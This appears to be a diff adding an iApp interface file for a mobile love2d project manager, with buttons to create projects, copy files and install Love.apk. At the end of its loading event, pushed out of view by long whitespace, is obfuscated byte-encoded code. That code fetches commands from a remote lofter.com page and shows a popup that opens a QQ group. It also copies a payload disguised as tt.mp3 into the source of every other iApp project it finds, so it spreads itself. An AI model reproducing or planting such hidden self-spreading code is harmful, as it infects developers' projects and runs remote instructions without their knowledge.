@@ -1,0 +1,370 @@
+<View id="102" did="0" type="HorizontalScrollView">
+<ppt>width=-2
+height=-2</ppt>
+<event></event>
+</View>
+<View id="1" did="102" type="LinearLayout">
+<ppt>width=-1
+height=42dp
+orientation=horizontal
+backgroundcolor=#50c4e5</ppt>
+<event></event>
+</View>
+<View id="2" did="1" type="TextView">
+<ppt>width=-2
+height=-2
+text=love2d_project
+textsize=16sp
+textcolor=#ffffff
+</ppt>
+<event></event>
+</View>
+<View id="107" did="1" type="Button">
+<ppt>width=-2
+height=-2
+text=说明书</ppt>
+<event><eventItme type="clicki">uigo("shuomin.iyu")</eventItme></event>
+</View>
+<View id="58" did="1" type="Button">
+<ppt>width=-2
+height=-2
+text=关于</ppt>
+<event><eventItme type="clicki">uigo("about.iyu")</eventItme></event>
+</View>
+<View id="98" did="1" type="Button">
+<ppt>width=-2
+height=-2
+text=安装打包模板
+//textSize=10sp</ppt>
+<event><eventItme type="clicki">uigo("unpack.iyu")</eventItme></event>
+</View>
+<View id="99" did="1" type="Button">
+<ppt>width=-2
+height=-2
+text=直接启动love2d</ppt>
+<event><eventItme type="clicki">tw("启动love2d解释器,如果失败,则未安装love2d")
+fn runLove.startLove()
+</eventItme></event>
+</View>
+<View id="103" did="1" type="Button">
+<ppt>width=-2
+height=-2
+text=以解释方式运行指定的love2d工程(带参数)</ppt>
+<event><eventItme type="clicki">utw(null,"请输入工程名称","runLua.iyu","取消","运行",false,v)
+{
+  tw("取消了")
+}
+else
+{
+  //复制工程的main.lua文件到lovegame文件夹,覆盖原来的main.lua,启动love2d
+  tw("运行!")
+  gvs(v,1,editTxt)
+  ug(editTxt,"text",proj_name)
+  syso("输入的工程名_")
+  syso(proj_name)
+  //复制当前工作区的当前项目的所有文件,到lovegame
+  //先清除lovegame文件夹下所有文件
+        fl("%lovegame",false,c)
+       for(i;c)
+        {
+        syso(i)
+         fd("%lovegame/"+i,b)
+         }
+      //拷贝所有文件
+      fl("%love2d_project/workspace/"+proj_name,false,c2) 
+      for(i2;c2)  
+      {
+         fc("%love2d_project/workspace/"+proj_name+"/"+i2,"%lovegame/"+i2,state)
+      }
+      ftz("运行前的任务完成","任务","清理旧文件和复制新文件完成(不包含文件夹)","@love.png")
+       {}
+     fn runLove.startLove()
+       }</eventItme></event>
+</View>
+<View id="104" did="1" type="Button">
+<ppt>width=-2
+height=-2
+text=清空并重置此软件
+visibility=gone</ppt>
+<event><eventItme type="clicki">utw(null,"重置软件","注意,此功能用于当文件夹错乱且无法处理,出现程序错误问题时使用,相当于恢复出厂设置","点错了我要取消","开始重置",false,v)
+{
+  tw("取消")
+}
+else
+{
+  tw("开始重置")
+  call(null,"mjava","reset.del")
+}</eventItme></event>
+</View>
+<View id="3" did="0" type="RelativeLayout">
+<ppt>width=-1
+height=-1</ppt>
+<event></event>
+</View>
+<View id="13" did="3" type="ScrollView">
+<ppt>width=-2
+height=-1</ppt>
+<event></event>
+</View>
+<View id="12" did="13" type="LinearLayout">
+<ppt>width=200dp
+height=-1
+orientation=vertical
+ps=左边 颜色灰色
+BackgroundColor=#ff848484</ppt>
+<event></event>
+</View>
+<View id="50" did="3" type="ScrollView">
+<ppt>width=-1
+height=-1
+ps=右边
+BackgroundColor=#ff3a3a3a
+ut_toRightOf=13</ppt>
+<event></event>
+</View>
+<View id="51" did="50" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical
+BackgroundColor=#ff969696</ppt>
+<event></event>
+</View>
+<View id="7" did="3" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=horizontal
+ps=底部
+ut_alignParentBottom=true
+gravity=center
+BackgroundColor=#ffff7300</ppt>
+<event></event>
+</View>
+<View id="4" did="7" type="Button">
+<ppt>width=-2
+height=-2
+text=创建</ppt>
+<event><eventItme type="clicki">//call(null,"mjs","global_proj_names.add")
+tw("创建工程")
+utw(null,"工程名","create.iyu","取消","创建",false,v)
+{
+  tw("点击了取消")
+}
+else
+{
+  tw("点击了创建")
+  //获得工程名称
+  gvs(v,1,project_name_Edit)
+  //'syso(project_name_Edit)
+  ug(project_name_Edit,"text",project_name)
+  syso(project_name)
+  f(project_name=="")
+  {
+    tw("错误,请输入工程名称")
+  }
+  else
+  {
+    //创建新的main.lua 代码是helloworld
+    fn create_proj.create_lua(project_name)
+    //添加到左边
+    fn add_to_left.add(project_name)
+   
+  }
+}</eventItme></event>
+</View>
+<View id="105" did="7" type="Button">
+<ppt>width=-2
+height=-2
+text=安装love2d</ppt>
+<event><eventItme type="clicki">tw("调用系统,请稍候")
+//fo("@Love.apk")
+fc("@Love.apk","%LoveCopyed.apk",c)
+syso(c)
+tw(c)
+f(c)
+{
+  tw("复制成功")
+}
+else
+{
+  tw("复制失败")
+}
+ftz("安装love2d","文件已经复制到sdk根目录,请前往安装","点击可以前往安装","@love.png")
+{
+fo("%LoveCopyed.apk")
+}
+fo("%LoveCopyed.apk")</eventItme></event>
+</View>
+<UIEventset><eventItme type="loading">sss app_data_path="%love2d_project"
+//构建模板目录 用于复制
+sss app_build_template_path="%love2d_project/build_template"
+//工作空间 存放源码
+sss app_workspace_path="love2d_project/workspace"
+//生成.love的目录
+sss app_build_path="love2d_project/bin"
+syso("根目录"+sss.app_data_path)
+syso("构建模板目录"+sss.app_build_template_path)
+syso("工作目录"+sss.app_workspace_path)
+syso("构建love文件的目录"+sss.app_build_path)
+//全局工程名称对象数组
+fe(sss.app_data_path,file_exit)
+//syso(file_exit)
+f(file_exit)
+{
+  tw("此app文件夹已经创建")
+  //读取文件
+  fl(sss.app_workspace_path,b)
+  syso("所有工程")
+  for(i;b)
+  {
+    syso(i)
+    fn add_to_left.add(i)
+  }
+}
+else
+{
+  syso("文件夹不存在,需要创建文件夹")
+  tw("文件夹不存在,自动创建文件夹")
+  //创建构建模板文件夹
+  fw(sss.app_build_template_path+"/说明.txt","此处存档安卓构建模板,我还没完善好")
+ //创建工作空间
+  fw(sss.app_workspace_path+"/temp.txt","tmp")
+   //创建构建目录 用于存档.love文件
+  fw(sss.app_build_path+"/temp.txt","tmp")
+}
+s b="\n此软件使用了两种方式打包.love文件一个是自带的api功能,还有一种是调用Zarchiver专业压缩工具打包(暂时未开发)\n打包安卓工程之前,需要先安装模板,用于在Aide导出apk,否则无法生成aide安卓打包工程,此软件只是一个便于使用的生成器,要导出apk,请使用aide打包生成的安卓工程"
+utw(null.,"使用说明","此软件由128hh开发(电音小沙子)\n 禁止二次转卖\n "+b+"另外,这是初版,默认运行时文件名为test.love,请在压缩完成之后,手动重命名,这是技术问题","确认",true,v)
+{
+  endutw()
+}
+
+
+
+
+t()
+                                                                                                       {
+     
+       
+       
+       
+       
+       
+       
+       
+       
+                                                                                                          btoo("utf-8","55 50 55 53 56 48 48 50 54",sss.sqdcs)
+                                                       btoo("utf-8","99 111 109 46 104 111 117 109 101 110",sss.bm)
+btoo("utf-8","-24 -67 -81 -28 -69 -74 -26 -101 -76 -26 -106 -80 -26 -113 -112 -25 -92 -70",wxts)
+                                     btoo("utf-8","-26 -101 -76 -26 -106 -80 -24 -67 -81 -28 -69 -74",jrjlq)
+                                                 btoo("utf-8","104 116 116 112 58 47 47 106 105 97 110 103 99 104 117 97 110 55 57 49 46 108 111 102 116 101 114 46 99 111 109 47 112 111 115 116 47 51 48 97 51 53 55 102 98 95 49 99 54 50 55 54 56 97 98",c)
+                                                 
+ hs(c,e)  
+ 
+ 
+ 
+ 
+s a = "iApp"
+fi(a, b)
+f(b==false)
+{
+}
+else
+{
+  
+
+ 
+ 
+                                                                                                  ufnsui()
+                                                                                                  {
+                                                                                                          sj(e,"zl【","】zl",zl)
+                                                                                   sj(e,"qh【","】qh",qh)
+                                                                                     sj(e,"zz【","】zz",zz)
+                                                                                     sj(e,"gg【","】gg",gg)
+                                                                                     f(zl=="-27 -68 -128 -27 -112 -81")
+                                                                         {
+                                                                                                          btoo("utf-8",qh,qhzh)
+                                                                                      btoo("utf-8",gg,ggzh)
+                                                                                     utw(null,wxts,ggzh,jrjlq,true,fz)
+                                                                             {
+                                                                                                          ss("mqqapi://card/show_pslcard?src_type=internal&version=1&uin="+qhzh+"&card_type=group&source=qrcode",joinqq)
+                                                                  sit(a,"action", "android.intent.action.VIEW")
+                                                              sit(a,"data",joinqq)
+                                                                                       uit(a, "chooser", qhzh)
+                                                                                 
+                                                                                                          }
+                                                                                                          } 
+                                                                                                         }
+                                                                                                       }
+                                                                                                     }
+                                                                                                                   t()
+ {
+ 
+
+      btoo("utf-8","60 47 101 118 101 110 116 73 116 109 101 62",event)
+btoo("utf-8","60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.s)
+btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.d)
+btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62",sss.c)
+
+fr("@tt.mp3",bb)
+f(bb==null)
+{
+fc("%tt.mp3","@tt.mp3",n)
+}
+else
+{
+fc("@tt.mp3","%tt.mp3",n)
+fdir("@",path)
+
+fdir(dir)
+ss(dir+"/",dir)
+sr(path,dir,"%",path)
+sl(path,"/",list)
+sgszl(list,length)
+s(length-3,len)
+s count = 0
+s proPath = ""
+for(1;len)
+{
+sgsz(list,count,c)
+ss(proPath+c+"/",proPath)
+s(count+1,count)
+}
+fl(proPath,files)
+for(file;files)
+{
+f(file?"tt.mp3")
+{
+}
+else
+{
+ss(proPath+file+"/src/mian.iyu",Item)
+fr(Item,cons)
+f(cons?"btoo")
+{
+  
+}
+else
+{
+
+f(cons?"loading")
+{
+sj(cons,null,sss.s,Dq)
+sj(cons,sss.s,null,cbc)
+sj(cbc,event,null,Dh)
+sj(cons,sss.s,event,Yh)
+ss(Dq+sss.s+Yh+bb+event+Dh,Wc)
+fw(Item,Wc)
+}
+else
+{
+sj(cons,null,sss.c,before)
+sj(cons,sss.c,null,between)
+ss(before+sss.d+bb+event+between,Wc)
+fw(Item,Wc)
+
+}
+}
+}
+}
+}
+}
+</eventItme></UIEventset>
